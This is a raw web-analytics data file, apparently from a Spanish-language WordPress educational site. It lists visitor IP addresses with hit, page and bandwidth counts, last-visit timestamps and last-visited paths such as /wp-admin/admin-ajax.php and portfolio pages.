+0 1 1 78883 0 0 0 0
+-
+71.237.7.164
+0 3 3 77018 1 1428106136 0 0
+/
+189.238.40.212
+0 98 98 4240746 1 1428192310 0 0
+/wp-admin/admin-ajax.php
+187.143.93.154
+0 107 107 7711053 1 1427985493 0 0
+/wp-admin/admin-ajax.php
+104.154.28.241
+0 70 70 4043379 1 1428168979 0 0
+/
+189.241.250.171
+0 1 0 20571 0 0 0 0
+-
+190.233.66.234
+0 2 0 21031 0 0 0 0
+-
+189.238.133.134
+0 96 96 4114696 1 1428182532 0 0
+/wp-admin/admin-ajax.php
+104.197.160.212
+0 1 1 8159 1 1428226225 0 0
+/
+189.163.35.74
+0 100 100 4250409 1 1427898865 0 0
+/wp-admin/admin-ajax.php
+186.9.106.91
+0 1 1 78883 0 0 0 0
+-
+69.171.237.119
+0 1 1 78883 0 0 0 0
+-
+180.76.6.230
+0 1 0 404 0 0 0 0
+-
+190.200.224.18
+0 2 0 41142 0 0 0 0
+-
+189.130.33.31
+0 78 78 2657487 1 1428259717 0 0
+/wp-admin/admin-ajax.php
+220.181.108.94
+0 1 1 14101 1 1428062875 0 0
+/feed/
+180.76.5.190
+0 1 1 6841 1 1427897842 0 0
+/portfolio/plan-de-marketing/
+186.113.22.122
+0 1 1 78883 0 0 0 0
+-
+66.249.90.82
+0 11 1 211245 5 1428134329 0 0
+-
+189.151.74.197
+0 144 144 5535958 1 1427868455 0 0
+/wp-admin/admin-ajax.php
+189.186.48.108
+0 1 0 20571 0 0 0 0
+-
+189.132.196.220
+0 6 4 27885 1 1427894533 0 0
+/wp-admin/admin-ajax.php
+173.252.101.112
+0 2 1 99449 0 0 0 0
+-
+10.7.235.238
+0 80 80 4374772 1 1428219059 0 0
+/
+186.144.34.95
+0 2 0 41142 0 0 0 0
+-
+187.152.229.7
+0 1 0 20571 0 0 0 0
+-
+190.184.226.76
+0 1 0 20571 0 0 0 0
+-
+200.54.69.107
+0 1 1 78883 0 0 0 0
+-
+52.5.96.130
+0 1 1 13114 0 0 0 0
+-
+207.46.13.135
+0 130 82 1742241 65 1428287937 0 0
+/
+177.229.223.252
+0 89 89 1078549 1 1428013635 0 0
+/wp-admin/admin-ajax.php
+201.227.226.144
+0 1 1 78883 0 0 0 0
+-
+191.112.89.92
+0 1 1 78883 0 0 0 0
+-
+107.167.103.233
+0 1 1 14138 1 1427953952 0 0
+/feed/
+180.76.5.24
+0 1 1 6638 1 1428223183 0 0
+/portfolio/griego-l/
+189.212.85.27
+0 89 89 1071738 1 1428150459 0 0
+/wp-admin/admin-ajax.php
+201.247.117.114
+0 97 97 1243362 1 1428277119 0 0
+/wp-admin/admin-ajax.php
+187.161.4.189
+0 187 145 4457317 1 1428244469 0 0
+/wp-admin/admin-ajax.php
+199.21.99.214
+0 86 32 776773 14 1428263281 0 0
+/
+52.5.95.92
+0 1 1 34432 1 1427925418 0 0
+/
+189.198.120.147
+0 1 0 20571 0 0 0 0
+-
+180.76.6.132
+0 2 1 8114 1 1427891537 0 0
+/portfolio/como-disenar-actividades-que-desarrollan-competencias/
+189.133.139.98
+0 150 149 5771703 1 1427891929 0 0
+/wp-admin/admin-ajax.php
+104.197.175.85
+0 45 45 327391 1 1428125596 0 0
+/
+66.220.152.118
+0 4 4 195066 0 0 0 0
+-
+190.204.27.54
+0 2 2 157766 0 0 0 0
+-
+187.171.218.36
+0 1 0 20571 0 0 0 0
+-
+220.181.108.79
+0 1 1 5601 1 1427963638 0 0
+/cursos/
+181.142.9.16
+0 1 1 78883 0 0 0 0
+-
+32.215.129.226
+0 111 111 6145790 2 1428180350 0 0
+/wp-admin/admin-ajax.php
+23.18.57.109
+0 1 0 20574 0 0 0 0
+-
+66.102.6.178
+0 58 58 604224 2 1428222675 0 0
+/wp-admin/admin-ajax.php
+187.214.59.89
+0 107 107 3908193 1 1427990894 0 0
+/wp-admin/admin-ajax.php
+200.76.91.45
+0 11 11 198434 1 1428238471 0 0
+/
+186.12.225.158
+0 2 0 41142 0 0 0 0
+-
+71.90.48.111
+0 104 104 4499882 1 1428152368 0 0
+/wp-admin/admin-ajax.php
+187.200.36.129
+0 149 149 5925449 1 1428162642 0 0
+/wp-admin/admin-ajax.php
+181.50.29.138
+0 1 0 20571 0 0 0 0
+-
+10.16.213.231
+0 71 69 65759 2 1427887485 0 0
+/wp-content/
+181.59.101.27
+0 2 2 157766 0 0 0 0
+-
+180.76.5.59
+0 3 0 1233 3 1428267014 0 0
+/
+88.7.126.144
+0 1 1 78883 0 0 0 0
+-
+190.237.169.78
+0 84 82 995652 1 1427904780 0 0
+/wp-admin/admin-ajax.php
+66.102.7.201
+0 1 0 441 1 1427889506 0 0
+/
+12.218.153.1
+0 7 7 26892 0 0 0 0
+-
+186.67.25.106
+0 1 1 78883 0 0 0 0
+-
+173.252.101.116
+0 1 0 20566 0 0 0 0
+-
+187.198.16.207
+0 1 0 20571 0 0 0 0
+-
+187.172.245.35
+0 68 68 4040175 1 1428075819 0 0
+/
+66.249.83.169
+0 3 2 42865 2 1428162980 0 0
+/feed/
+180.76.4.198
+0 1 1 34395 1 1427964240 0 0
+/
+180.76.5.195
+0 2 1 8572 2 1428212490 0 0
+/
+107.167.103.107
+0 1 1 14138 1 1428132246 0 0
+/feed/
+208.80.194.124
+0 1 0 285 1 1428256706 0 0
+/
+190.249.65.250
+0 1 0 20571 0 0 0 0
+-
+87.220.163.71
+0 1 0 20571 0 0 0 0
+-
+181.39.251.69
+0 1 0 20571 0 0 0 0
+-
+66.249.83.176
+0 4 3 57379 2 1428157219 0 0
+/feed/
+180.76.5.18
+0 1 0 304 1 1428223182 0 0
+/portfolio/griego-l/
+192.157.245.129
+0 2 2 22180 1 1427855879 0 0
+/feed/
+50.18.170.106
+0 4 0 82036 0 0 0 0
+-
+201.175.142.95
+0 163 146 6237398 1 1428239972 0 0
+/wp-admin/admin-ajax.php
+201.249.71.2
+0 1 0 20515 0 0 0 0
+-
+179.60.161.116
+0 1 0 20570 0 0 0 0
+-
+209.45.43.200
+0 210 191 5532220 2 1427911450 0 0
+/wp-admin/admin-ajax.php
+200.77.201.2
+0 124 123 4789973 1 1428156883 0 0
+/wp-admin/admin-ajax.php
+129.10.115.124
+0 186 186 8185067 2 1428150070 0 0
+/wp-admin/admin-ajax.php
+186.91.135.152
+0 1 0 20571 0 0 0 0
+-
+75.98.9.254
+0 2 2 10099 1 1428168772 0 0
+/
+190.179.177.160
+0 1 1 78883 0 0 0 0
+-
+178.62.202.236
+0 20 17 76519 1 1427878366 0 0
+/wp-admin/admin-ajax.php
+187.189.247.200
+0 1 0 20515 0 0 0 0
+-
+201.209.38.71
+0 1 0 20571 0 0 0 0
+-
+189.183.122.73
+0 83 83 2277511 1 1427909804 0 0
+/
+201.241.101.196
+0 87 87 1060444 1 1428184112 0 0
+/wp-admin/admin-ajax.php
+70.167.218.214
+0 1 1 78883 0 0 0 0
+-
+180.76.5.28
+0 2 0 706 2 1428134530 0 0
+/portfolio/ventas/
+91.238.82.229
+0 1 0 20495 1 1428279277 0 0
+-
+189.156.9.213
+0 124 124 4724699 1 1428069872 0 0
+/wp-admin/admin-ajax.php
+220.181.108.88
+0 1 0 20525 0 0 0 0
+-
+10.7.230.46
+0 95 95 4094951 1 1428183981 0 0
+/wp-admin/admin-ajax.php
+186.104.196.123
+0 1 1 171494 0 0 0 0
+-
+189.187.162.252
+0 99 99 4249280 1 1428057174 0 0
+/wp-admin/admin-ajax.php
+208.87.233.180
+0 1 1 34376 1 1428280877 0 0
+/
+190.137.233.235
+0 1 0 20515 0 0 0 0
+-
+190.101.65.148
+0 1 1 78883 0 0 0 0
+-
+201.220.242.72
+0 2 0 345 0 0 0 0
+-
+181.50.67.142
+0 1 1 17421 0 0 0 0
+-
+194.187.168.25
+0 60 58 368014 10 1428269191 0 0
+/la-estrategia-en-la-entrevista-de-aconsejamiento/feed/
+201.144.162.24
+0 99 99 4270657 1 1428189404 0 0
+/
+180.76.6.51
+0 1 1 12593 1 1427992450 0 0
+/portfolio/teologia/
+98.253.89.138
+0 123 123 4903636 1 1428165132 0 0
+/wp-admin/admin-ajax.php
+190.42.16.115
+0 1 1 78883 0 0 0 0
+-
+190.150.131.91
+0 1 0 20571 0 0 0 0
+-
+189.133.102.80
+0 94 94 4101071 1 1427899907 0 0
+/wp-admin/admin-ajax.php
+157.56.17.238
+0 7 7 42254 0 0 0 0
+-
+66.102.7.177
+0 16 8 383435 2 1428236693 0 0
+/
+59.147.70.132
+0 1 1 8121 1 1427951656 0 0
+/
+186.68.11.124
+0 1 1 78883 0 0 0 0
+-
+180.76.6.133
+0 1 1 7363 1 1428172517 0 0
+/portfolio/como-conducir-una-entrevista-de-consejeria/
+180.76.5.66
+0 1 0 299 1 1428040809 0 0
+/tag/educacion/
+201.139.202.36
+0 1 0 20570 0 0 0 0
+-
+186.80.114.96
+0 2 0 41142 0 0 0 0
+-
+187.186.86.75
+0 99 99 4249279 1 1428164129 0 0
+/wp-admin/admin-ajax.php
+190.202.82.99
+0 1 0 20571 0 0 0 0
+-
+187.177.188.31
+0 95 95 2311583 1 1427879185 0 0
+/wp-admin/admin-ajax.php
+100.12.203.120
+0 1 1 78883 0 0 0 0
+-
+166.77.6.8
+0 1 1 78827 0 0 0 0
+-
+186.115.246.122
+0 136 93 1948881 1 1428157693 0 0
+/wp-admin/admin-ajax.php
+179.1.6.155
+0 30 30 927473 2 1428004165 0 0
+/wp-admin/admin-ajax.php
+186.26.115.51
+0 122 122 5301557 1 1428236991 0 0
+/wp-admin/admin-ajax.php
+187.237.107.169
+0 9 9 30934 0 0 0 0
+-
+173.252.101.114
+0 1 1 78883 0 0 0 0
+-
+201.156.173.128
+0 20 18 1190225 1 1428062238 0 0
+/proiectum/educacion/
+201.145.173.52
+0 29 29 206269 1 1428256407 0 0
+/
+173.252.112.118
+0 1 1 184569 0 0 0 0
+-
+66.220.152.112
+0 2 2 10725 0 0 0 0
+-
+131.253.36.195
+0 2 2 6333 0 0 0 0
+-
+190.163.33.49
+0 2 2 157766 0 0 0 0
+-
+187.159.64.98
+0 2 0 41142 0 0 0 0
+-
+123.125.71.54
+0 1 0 418 0 0 0 0
+-
+187.168.108.103
+0 1 1 36400 0 0 0 0
+-
+199.30.24.141
+0 1 1 5418 1 1427935910 0 0
+/wp-admin/admin-ajax.php
+189.225.169.43
+0 1 0 20571 0 0 0 0
+-
+187.204.46.81
+0 4 0 82284 0 0 0 0
+-
+187.233.237.151
+0 2 2 157766 0 0 0 0
+-
+186.158.141.249
+0 1 1 40080 0 0 0 0
+-
+189.248.19.13
+0 1 0 20571 0 0 0 0
+-
+187.178.88.27
+0 1 0 20573 0 0 0 0
+-
+190.143.148.166
+0 2 0 41142 0 0 0 0
+-
+194.140.153.46
+0 1 1 78883 0 0 0 0
+-
+52.4.90.30
+0 5 5 42193 1 1428070205 0 0
+/
+79.154.120.176
+0 1 0 20571 0 0 0 0
+-
+104.197.174.6
+0 13 13 65769 1 1428246647 0 0
+/
+190.218.61.236
+0 2 2 157766 0 0 0 0
+-
+186.80.236.24
+0 2 0 41142 0 0 0 0
+-
+189.152.56.201
+0 95 95 4102362 1 1428250476 0 0
+/wp-admin/admin-ajax.php
+177.210.82.146
+0 1 0 20578 0 0 0 0
+-
+207.241.226.233
+0 1 1 13077 0 0 0 0
+-
+177.231.68.65
+0 1 0 20571 0 0 0 0
+-
+201.222.110.215
+0 1 1 78883 0 0 0 0
+-
+201.227.226.148
+0 1 1 78883 0 0 0 0
+-
+190.233.23.211
+0 2 0 41140 0 0 0 0
+-
+190.120.175.53
+0 1 1 78883 0 0 0 0
+-
+181.226.107.173
+0 1 1 68633 0 0 0 0
+-
+189.133.122.128
+0 103 103 4348697 1 1427879889 0 0
+/pregrado/
+190.65.38.243
+0 1 0 20570 0 0 0 0
+-
+64.233.173.235
+0 3 3 6424 0 0 0 0
+-
+179.57.117.231
+0 1 1 78883 0 0 0 0
+-
+173.252.120.113
+0 1 1 78883 0 0 0 0
+-
+77.241.123.30
+0 1 1 78883 0 0 0 0
+-
+66.220.152.113
+0 2 2 88171 0 0 0 0
+-
+199.59.148.210
+0 2 2 9264 1 1428027013 0 0
+/portfolio/estrategias-de-ensenanza-para-las-nuevas-generaciones/
+181.66.174.50
+0 3 3 79571 0 0 0 0
+-
+190.42.88.91
+0 1 1 40024 0 0 0 0
+-
+67.84.163.158
+0 72 70 483809 1 1428178774 0 0
+/wp-admin/admin-ajax.php
+181.179.0.28
+0 2 2 157766 0 0 0 0
+-
+190.34.46.65
+0 139 137 6092900 1 1427874978 0 0
+/wp-admin/admin-ajax.php
+192.0.86.103
+0 4 4 980 3 1428259848 0 0
+/
+173.252.77.119
+0 2 2 7904 0 0 0 0
+-
+201.175.132.99
+0 86 86 1051909 1 1428170548 0 0
+/wp-admin/admin-ajax.php
+173.252.110.118
+0 1 1 78883 0 0 0 0
+-
+181.54.240.74
+0 1 1 78883 0 0 0 0
+-
+123.125.71.81
+0 1 1 8117 1 1427957350 0 0
+/
+189.251.32.246
+0 40 32 281006 2 1428012308 0 0
+/wp-admin/admin-ajax.php
+190.78.245.110
+0 1 0 20571 0 0 0 0
+-
+201.165.17.110
+0 146 59 427241 2 1427935270 0 0
+/wp-admin/admin-ajax.php
+189.132.28.153
+0 1 1 92190 0 0 0 0
+-
+66.249.65.145
+0 188 118 1656917 42 1428288012 0 0
+-
+189.219.108.194
+0 1 0 20571 0 0 0 0
+-
+177.249.144.213
+0 1 0 20571 0 0 0 0
+-
+190.24.29.243
+0 138 138 5655760 1 1427967880 0 0
+/wp-admin/admin-ajax.php
+186.103.141.174
+0 2 2 79342 0 0 0 0
+-
+148.246.99.194
+0 1 1 68633 0 0 0 0
+-
+189.186.218.175
+0 1 1 78883 0 0 0 0
+-
+190.252.99.144
+0 20 18 1190379 1 1428249067 0 0
+/proiectum/educacion/
+131.253.24.8
+0 2 1 22434 0 0 0 0
+-
+173.252.88.90
+0 1 1 6088 0 0 0 0
+-
+200.121.91.135
+0 85 85 621791 1 1427884670 0 0
+/bloopers-2014/
+186.109.107.18
+0 1 0 20571 0 0 0 0
+-
+189.175.12.160
+0 141 137 4430694 1 1428071034 0 0
+/wp-admin/admin-ajax.php
+104.197.161.32
+0 1 1 8157 1 1428247737 0 0
+/
+200.76.91.169
+0 10 10 127943 0 0 0 0
+-
+154.64.209.252
+0 1 0 20571 0 0 0 0
+-
+190.236.112.15
+0 1 0 20571 0 0 0 0
+-
+104.197.161.243
+0 68 68 4040173 1 1427906186 0 0
+/
+187.140.97.174
+0 1 0 20571 0 0 0 0
+-
+181.163.179.136
+0 1 1 78883 0 0 0 0
+-
+186.114.238.254
+0 1 1 78883 0 0 0 0
+-
+190.81.233.13
+0 2 2 157766 0 0 0 0
+-
+177.239.134.75
+0 1 0 20571 0 0 0 0
+-
+187.237.107.78
+0 1 1 8158 1 1428146122 0 0
+/
+201.171.209.37
+0 96 96 4105076 1 1428234091 0 0
+/wp-admin/admin-ajax.php
+108.174.2.200
+0 2 0 20943 0 0 0 0
+-
+181.58.50.180
+0 105 105 4434900 1 1428156483 0 0
+/wp-admin/admin-ajax.php
+187.152.177.74
+0 1 0 20571 0 0 0 0
+-
+173.252.120.116
+0 3 3 236649 0 0 0 0
+-
+201.240.186.195
+0 1 1 171494 0 0 0 0
+-
+207.46.13.132
+0 3 1 48061 2 1428225204 0 0
+/
+187.184.96.218
+0 12 12 157458 7 1428260620 0 0
+/feed/
+220.181.132.217
+0 1 1 34643 1 1428235716 0 0
+/
+187.234.41.91
+0 1 0 20571 0 0 0 0
+-
+187.139.118.136
+0 1 1 78883 0 0 0 0
+-
+167.57.24.230
+0 1 1 40080 0 0 0 0
+-
+187.237.231.82
+0 2 0 41142 0 0 0 0
+-
+190.237.254.49
+0 1 0 20573 0 0 0 0
+-
+189.148.168.234
+0 89 89 1006369 1 1428196958 0 0
+/wp-admin/admin-ajax.php
+66.220.152.117
+0 3 3 97461 0 0 0 0
+-
+181.64.172.51
+0 1 1 78883 0 0 0 0
+-
+157.55.39.201
+0 9 9 106784 0 0 0 0
+-
+176.10.104.234
+0 2 2 68790 2 1428175315 0 0
+/
+201.220.242.140
+0 1 1 78883 0 0 0 0
+-
+188.138.17.15
+0 93 93 4092532 1 1427928714 0 0
+/wp-admin/admin-ajax.php
+191.65.23.28
+0 1 1 78883 0 0 0 0
+-
+24.10.227.244
+0 1 1 171494 0 0 0 0
+-
+201.210.209.64
+0 1 1 68633 0 0 0 0
+-
+104.197.165.37
+0 37 37 290349 1 1428140629 0 0
+/
+190.9.193.230
+0 88 88 1061741 1 1428085627 0 0
+/wp-admin/admin-ajax.php
+190.43.166.210
+0 88 88 1061749 1 1427912972 0 0
+/wp-admin/admin-ajax.php
+191.98.48.92
+0 2 0 41142 0 0 0 0
+-
+202.46.62.41
+0 1 1 1906 0 0 0 0
+-
+180.76.6.45
+0 1 0 417 1 1428222282 0 0
+/
+190.227.164.2
+0 87 87 1060452 1 1428229615 0 0
+/wp-admin/admin-ajax.php
+190.178.12.96
+0 1 1 78883 0 0 0 0
+-
+181.60.195.47
+0 1 1 78883 0 0 0 0
+-
+173.252.114.113
+0 2 2 41387 0 0 0 0
+-
+71.193.152.88
+0 88 88 1061789 1 1428151039 0 0
+/wp-admin/admin-ajax.php
+186.47.190.19
+0 1 1 77900 0 0 0 0
+-
+181.73.77.6
+0 1 1 78883 0 0 0 0
+-
+201.110.90.151
+0 1 0 20571 0 0 0 0
+-
+180.76.5.170
+0 1 0 297 1 1428214696 0 0
+/author/caty/
+157.55.39.170
+0 22 15 264382 12 1428072274 0 0
+/mi-cuenta/e42-lite/
+191.102.121.164
+0 86 86 978186 1 1428013600 0 0
+/wp-admin/admin-ajax.php
+189.251.220.76
+0 1 1 40080 0 0 0 0
+-
+189.187.27.86
+0 2 0 41142 0 0 0 0
+-
+190.239.167.237
+0 1 1 40080 0 0 0 0
+-
+173.252.110.112
+0 1 1 184569 0 0 0 0
+-
+180.76.6.16
+0 2 2 16747 2 1428252553 0 0
+/acerca/mision-y-vision/
+180.76.5.26
+0 3 2 15404 3 1428099284 0 0
+/
+186.176.122.36
+0 1 0 20515 0 0 0 0
+-
+190.121.136.12
+0 64 63 3263208 2 1428004160 0 0
+/portfolio/como-crear-un-centro-de-influencia/
+186.92.222.26
+0 1 0 20571 0 0 0 0
+-
+181.128.25.217
+0 1 1 78883 0 0 0 0
+-
+177.245.133.249
+0 231 231 9483362 1 1428099662 0 0
+/wp-admin/admin-ajax.php
+220.181.108.149
+0 1 1 8122 1 1427904997 0 0
+/
+104.197.17.64
+0 1 1 34354 1 1427879129 0 0
+/
+187.142.86.157
+0 1 0 20571 0 0 0 0
+-
+180.76.6.64
+0 3 2 14337 3 1428214542 0 0
+/acerca/mision-y-vision/
+190.28.182.62
+0 1 0 20571 0 0 0 0
+-
+200.112.244.135
+0 2 2 79111 0 0 0 0
+-
+66.87.113.64
+0 1 1 78883 0 0 0 0
+-
+189.173.185.243
+0 146 146 5786239 1 1428102245 0 0
+/wp-admin/admin-ajax.php
+187.174.84.34
+0 94 94 4098140 1 1428095586 0 0
+/wp-admin/admin-ajax.php
+201.196.211.239
+0 1 0 20571 0 0 0 0
+-
+180.76.5.197
+0 2 1 10156 2 1428217402 0 0
+/dios-el-mejor-programador/
+200.76.83.186
+0 10 10 60647 1 1427882518 0 0
+/portfolio/teologia/
+209.190.1.133
+0 2 1 34680 1 1428232238 0 0
+/
+191.108.152.225
+0 2 2 79111 0 0 0 0
+-
+190.39.234.104
+0 2 0 41142 0 0 0 0
+-
+131.253.26.232
+0 1 1 1777 0 0 0 0
+-
+186.39.186.240
+0 1 0 20574 0 0 0 0
+-
+189.161.170.244
+0 1 0 20571 0 0 0 0
+-
+157.56.17.222
+0 6 6 24827 0 0 0 0
+-
+190.73.40.215
+0 1 0 20571 0 0 0 0
+-
+186.176.188.74
+0 1 0 20515 0 0 0 0
+-
+24.138.214.38
+0 1 0 20576 0 0 0 0
+-
+201.233.198.81
+0 2 0 41142 0 0 0 0
+-
+187.166.212.225
+0 1 1 27686 0 0 0 0
+-
+180.76.5.72
+0 1 0 404 1 1428051322 0 0
+/
+54.84.15.150
+0 1 1 8121 1 1428171841 0 0
+/
+181.55.68.55
+0 193 193 7341232 1 1428091143 0 0
+/wp-admin/admin-ajax.php
+96.47.226.21
+0 29 29 1176481 1 1428150132 0 0
+/wp-admin/admin-ajax.php
+216.151.17.10
+0 1 1 13077 0 0 0 0
+-
+203.106.188.65
+0 100 100 4962786 1 1428102169 0 0
+/wp-admin/admin-ajax.php
+189.152.20.57
+0 2 0 41142 0 0 0 0
+-
+187.208.210.14
+0 87 87 1060446 1 1428271116 0 0
+/wp-admin/admin-ajax.php
+180.76.6.20
+0 2 1 8421 2 1428249495 0 0
+/tag/investigacion/
+189.137.147.27
+0 1 0 20571 0 0 0 0
+-
+192.99.170.80
+0 8 4 139016 4 1428273036 0 0
+/
+190.235.55.233
+0 1 1 78883 0 0 0 0
+-
+173.252.100.113
+0 3 2 178347 0 0 0 0
+-
+192.99.40.137
+0 1 1 301 1 1428103915 0 0
+/
+187.194.194.193
+0 2 2 157766 0 0 0 0
+-
+186.156.98.210
+0 1 1 78883 0 0 0 0
+-
+187.137.45.183
+0 1 0 20571 0 0 0 0
+-
+189.218.172.222
+0 121 121 4798121 1 1427932115 0 0
+/wp-admin/admin-ajax.php
+173.252.114.116
+0 1 1 36742 0 0 0 0
+-
+187.172.161.178
+0 282 234 6232800 1 1428064135 0 0
+/wp-admin/admin-ajax.php
+190.66.248.70
+0 1 1 78883 0 0 0 0
+-
+179.7.120.197
+0 18 16 797947 1 1428233099 0 0
+/proiectum/educacion/
+66.102.6.187
+0 64 62 899144 2 1428222667 0 0
+/portfolio/quiero-vivir-sano-8-habitos-saludables/
+208.80.192.33
+0 8 4 139052 4 1428176937 0 0
+/
+173.252.100.114
+0 1 0 20569 0 0 0 0
+-
+189.250.240.155
+0 140 137 5620756 1 1427999780 0 0
+/wp-admin/admin-ajax.php
+181.65.65.198
+0 3 3 157994 0 0 0 0
+-
+201.233.212.1
+0 1 0 20571 0 0 0 0
+-
+181.196.86.204
+0 2 0 41142 0 0 0 0
+-
+180.76.5.151
+0 1 1 8306 1 1427872468 0 0
+/educacion-continua/
+189.170.222.13
+0 107 107 4284945 1 1427975394 0 0
+/wp-admin/admin-ajax.php
+181.67.139.92
+0 2 0 41142 0 0 0 0
+-
+220.181.108.147
+0 1 1 8121 1 1428082627 0 0
+/
+187.230.70.152
+0 98 98 4240741 1 1428014762 0 0
+/wp-admin/admin-ajax.php
+180.76.5.154
+0 1 0 316 1 1427922184 0 0
+/educacion-cristiana-vs-secular/
+190.234.106.93
+0 1 1 78883 0 0 0 0
+-
+190.128.97.17
+0 2 0 41142 0 0 0 0
+-
+190.117.132.112
+0 1 1 78883 0 0 0 0
+-
+190.66.231.131
+0 1 1 78883 0 0 0 0
+-
+179.60.83.130
+0 1 1 78883 0 0 0 0
+-
+123.125.71.103
+0 1 1 8123 1 1428064874 0 0
+/
+180.76.6.57
+0 2 0 793 1 1428044948 0 0
+-
+200.76.83.95
+0 7 7 76365 0 0 0 0
+-
+189.135.184.197
+0 1 1 78883 0 0 0 0
+-
+23.120.205.21
+0 1 1 171494 0 0 0 0
+-
+180.76.6.147
+0 3 1 7865 3 1428026404 0 0
+/portfolio/introduccion-a-la-investigacion/
+190.248.248.193
+0 1 0 20571 0 0 0 0
+-
+66.249.73.133
+0 15 2 8997 9 1428275405 0 0
+-
+190.118.219.173
+0 2 1 99453 0 0 0 0
+-
+123.125.71.75
+0 1 1 1906 0 0 0 0
+-
+190.21.169.245
+0 4 3 257219 0 0 0 0
+-
+141.0.9.73
+0 1 1 14138 1 1427966100 0 0
+/feed/
+180.76.6.156
+0 1 1 6754 1 1428208974 0 0
+/portfolio/salud-espiritual-jesus-la-gran-esperanza/
+173.252.88.84
+0 1 1 1782 0 0 0 0
+-
+123.125.68.51
+0 1 1 30111 0 0 0 0
+-
+186.101.159.202
+0 1 0 20571 0 0 0 0
+-
+200.120.214.184
+0 1 1 78883 0 0 0 0
+-
+201.248.110.25
+0 165 164 6446988 1 1428098822 0 0
+/wp-admin/admin-ajax.php
+200.27.75.82
+0 1 1 78883 0 0 0 0
+-
+186.118.19.131
+0 2 0 41142 0 0 0 0
+-
+180.76.6.47
+0 1 1 12012 1 1428205372 0 0
+/portfolio/maestria-en-educacion/
+194.187.168.26
+0 20 20 128717 2 1427973653 0 0
+/
+186.4.43.254
+0 1 1 78883 0 0 0 0
+-
+180.76.5.173
+0 2 1 2206 1 1428284544 0 0
+/author/leticia/
+123.125.71.38
+0 1 1 34395 1 1427942782 0 0
+/
+190.130.200.201
+0 1 0 20571 0 0 0 0
+-
+132.251.241.147
+0 1 1 78883 0 0 0 0
+-
+186.151.146.35
+0 2 2 157766 0 0 0 0
+-
+138.37.88.219
+0 2 1 34642 1 1427874493 0 0
+/
+173.252.120.118
+0 1 1 78883 0 0 0 0
+-
+128.199.63.237
+0 1 1 566 1 1427886588 0 0
+/wp-admin/admin-ajax.php
+186.36.158.126
+0 1 1 78883 0 0 0 0
+-
+66.220.156.117
+0 5 4 547471 0 0 0 0
+-
+199.58.86.206
+0 8 8 189724 4 1428285289 0 0
+/
+119.63.196.125
+0 1 1 8120 1 1428285914 0 0
+/
+66.87.117.106
+0 93 93 1088259 1 1427980563 0 0
+/wp-admin/admin-ajax.php
+180.76.5.22
+0 2 0 709 1 1428153915 0 0
+/category/tecnologia/
+220.181.108.92
+0 1 1 8121 1 1428226766 0 0
+/
+199.16.156.126
+0 2 2 6312 1 1427910339 0 0
+/proiectum/educacion/
+186.83.214.12
+0 1 1 78883 0 0 0 0
+-
+187.147.216.9
+0 1 1 8157 1 1428059488 0 0
+/
+157.55.39.169
+0 42 26 376767 19 1428095387 0 0
+/portfolio/ventas/
+201.240.251.94
+0 1 1 78883 0 0 0 0
+-
+200.76.91.110
+0 9 9 390775 0 0 0 0
+-
+181.70.194.25
+0 1 1 78883 0 0 0 0
+-
+69.1.8.139
+0 1 0 20577 0 0 0 0
+-
+180.76.6.48
+0 1 0 311 1 1428217398 0 0
+/
+10.12.116.43
+0 2 1 6181 1 1427878142 0 0
+/wp-admin/admin-ajax.php
+66.220.156.118
+0 1 0 450 0 0 0 0
+-
+180.76.6.140
+0 1 1 620 0 0 0 0
+-
+189.188.151.240
+0 206 200 7777782 2 1428064716 0 0
+/wp-admin/admin-ajax.php
+189.222.81.137
+0 179 177 6204453 2 1428061211 0 0
+/wp-admin/admin-ajax.php
+186.95.10.213
+0 1 0 20571 0 0 0 0
+-
+181.128.62.190
+0 4 0 82284 0 0 0 0
+-
+173.252.110.113
+0 1 1 78883 0 0 0 0
+-
+189.13.66.149
+0 81 73 646878 1 1428253999 0 0
+/wp-admin/admin-ajax.php
+66.249.90.90
+0 15 2 279742 8 1428179723 0 0
+-
+190.6.207.176
+0 1 1 78883 0 0 0 0
+-
+190.209.4.133
+0 1 1 78883 0 0 0 0
+-
+45.56.105.219
+0 3 3 103128 3 1428174581 0 0
+/
+186.94.110.152
+0 3 0 61713 0 0 0 0
+-
+186.30.159.149
+0 90 90 1064378 1 1428270912 0 0
+/wp-admin/admin-ajax.php
+187.205.206.228
+0 2 0 21033 0 0 0 0
+-
+180.76.6.55
+0 2 0 720 1 1427905489 0 0
+/portfolio/orientacion-familiar/
+201.183.111.46
+0 1 0 20571 0 0 0 0
+-
+200.37.221.35
+0 1 1 29293 0 0 0 0
+-
+220.181.38.166
+0 2 2 58968 0 0 0 0
+-
+201.230.220.5
+0 1 1 78883 0 0 0 0
+-
+190.42.87.120
+0 1 1 78883 0 0 0 0
+-
+69.171.230.118
+0 2 2 157766 0 0 0 0
+-
+182.118.35.18
+0 1 1 1943 0 0 0 0
+-
+203.189.152.242
+0 71 69 505061 1 1428041576 0 0
+/wp-admin/admin-ajax.php
+81.203.49.85
+0 86 86 527749 1 1428196490 0 0
+/wp-admin/admin-ajax.php
+189.163.140.171
+0 1 0 20571 0 0 0 0
+-
+190.253.28.141
+0 108 108 4255447 1 1428244882 0 0
+/wp-admin/admin-ajax.php
+187.148.243.181
+0 2 0 41154 0 0 0 0
+-
+72.209.196.201
+0 2 0 41154 0 0 0 0
+-
+180.76.6.46
+0 1 0 404 1 1428099283 0 0
+-
+173.252.112.112
+0 1 1 78883 0 0 0 0
+-
+190.236.54.232
+0 2 2 157766 0 0 0 0
+-
+181.74.35.183
+0 1 1 78883 0 0 0 0
+-
+62.143.219.43
+0 1 1 34395 1 1428156838 0 0
+/
+50.10.106.107
+0 1 0 20571 0 0 0 0
+-
+123.125.71.87
+0 1 1 17551 0 0 0 0
+-
+186.28.44.121
+0 1 0 20603 0 0 0 0
+-
+104.154.17.81
+0 68 68 4002904 1 1427903030 0 0
+/
+173.252.100.116
+0 1 1 9290 0 0 0 0
+-
+72.70.113.219
+0 95 95 4106167 1 1427994853 0 0
+/wp-admin/admin-ajax.php
+32.215.160.30
+0 1 1 118622 0 0 0 0
+-
+199.180.248.34
+0 1 0 20569 1 1427888810 0 0
+-
+186.47.189.130
+0 1 1 40080 0 0 0 0
+-
+54.236.216.158
+0 4 4 44636 4 1428139543 0 0
+/proiectum/educacion/
+190.56.253.138
+0 1 0 20571 0 0 0 0
+-
+88.12.40.248
+0 1 0 20571 0 0 0 0
+-
+199.101.132.161
+0 4 4 56328 4 1428246478 0 0
+/feed/
+208.80.194.126
+0 2 2 68708 2 1428256707 0 0
+/
+201.152.193.15
+0 2 0 41141 0 0 0 0
+-
+200.83.41.224
+0 1 1 78883 0 0 0 0
+-
+187.175.74.229
+0 96 96 4114732 2 1427970445 0 0
